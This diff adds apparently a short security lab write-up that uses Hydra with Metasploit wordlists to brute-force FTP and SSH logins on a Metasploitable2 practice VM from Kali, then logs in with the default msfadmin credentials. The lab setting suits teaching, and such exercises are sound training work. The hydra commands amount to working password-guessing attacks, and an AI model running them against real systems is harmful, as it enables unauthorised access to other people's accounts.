@@ -1,0 +1,21 @@
+STEPS: 1. Start Kali and Metasploitable2 VMs. 2. Find Metasploitable IP:
+ifconfig 3. Edit password wordlist: sudo vi
+/opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
+Add: msfadmin
+
+4.  Run Hydra for FTP: hydra -l msfadmin -P
+    /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
+    ftp://<ip>
+
+5.  Login to FTP: ftp Username: msfadmin Password: msfadmin Commands:
+    ls, pwd, cd, get, bye
+
+6.  Login using SSH: ssh msfadmin@ Password: msfadmin
+
+7.  Brute force using user list: sudo cp
+    /usr/share/wordlists/metasploit/unix_users.txt users.txt Edit and
+    keep few users. hydra -L users.txt -P
+    /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
+    ssh
+
+RESULT: Weak password identified using Hydra.
